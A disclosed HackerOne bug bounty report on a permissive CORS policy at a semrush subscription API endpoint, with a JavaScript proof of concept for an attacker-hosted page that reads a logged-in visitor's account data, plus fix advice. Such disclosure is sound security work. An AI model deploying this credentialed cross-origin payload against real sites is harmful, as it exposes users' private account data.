# CORS misconfiguration which leads to the disclosure of certain data concerning the user.

## Report Details
- **Report ID**: 769058
- **URL**: https://hackerone.com/reports/769058
- **State**: Closed
- **Severity**: low
- **Submitted**: 2020-01-06T22:03:53.071Z
- **Disclosed**: 2020-02-15T18:42:05.327Z

## Reporter
- **Username**: a_d_a_m
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: semrush

## Vulnerability Information
# INTRODUCTION

## _I used an account to search for this vulnerability:_

id: 5407773	email: adam-bugbounty@anosimple.com

## _IP used:_
__2a01:e34:ec2a:9240:7d25:26c3:1449:bfe7__

## _endpoint URL:_
https://www.semrush.com/content-paywall/api/accesslevel

## _Summary:_
CORS policy too permissive.

# EXPLOITATION

## _Description of Security Issue:_ 
When we navigate on semrush we are led to make a request like this: █████
This request returns a JSON response with 4 elements (about Subscription):
- __product_group :__    ex: FREE , GUEST , ....

- __used_trial :__ If the user has used his trial period. ex: false , true , null (if he's a guest)

- __is_custom :__ I didn't understand this element.

- __upgraded :__ I think that says if the user has upgraded their account.

The problem is in the fact that when you send an origin that is not controlled by semrush the server still allows you to send cross-origin query.

## _Steps needed to reproduce bug:_

 - Put this payload on your website:

```javascript

var invocation = new XMLHttpRequest();

  invocation.onreadystatechange = function() {
    if (invocation.readyState == XMLHttpRequest.DONE) {
      alert(invocation.response);
    }
  }

function cors(){
  if(invocation) {
    invocation.open('GET', "https://www.semrush.com/content-paywall/api/accesslevel", true);
    invocation.withCredentials = true;
    invocation.send(); 
  }
}

cors();

```

- Connect you on semrush and visit the evil website

- Congratulations your website has stolen some of your data!

# FIX THE BUG

__Stop setting Access-Control-Allow-Origin: .... and Access-Control-Allow-Credentials: true when the origin is not known.__

Thank you and I remain at your disposal if necessary
Have a nice evening :)

## Impact

This allows all sites to access certain data about visitors who have semrush.

## Attachments
No attachments
